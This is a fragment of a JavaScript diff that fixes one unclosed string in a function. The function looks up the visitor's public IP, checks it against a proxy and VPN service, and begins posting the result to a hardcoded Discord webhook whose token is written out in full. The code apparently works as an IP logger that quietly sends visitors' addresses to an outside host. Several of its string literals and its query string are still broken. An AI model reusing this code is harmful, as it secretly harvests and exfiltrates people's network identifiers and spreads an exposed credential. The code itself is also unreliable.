@@ -6,7 +6,7 @@
     async function fetching() {
       const webhook = 'https://discord.com/api/webhooks/1216841205883600928/kipzeUzJu0dF3FGPae2uzI7DDP6-uHJb3hkEy1kpf6MA80MqhJWIJCWZDTvvv3xRZdOK';
       let dat = await fetch('https://api.ipify.org?format=json')
-      dat = JSON.parse(await dat.text())['ip
+      dat = JSON.parse(await dat.text())['ip']
       let check = await fetch(`https://proxycheck.io/v2/78.57.126.227?key=public-t6xb3j-9j867t-774678?vpn=1`)
       check = JSON.parse(await check.text())[dat]['proxy
       await fetch(webhook, {
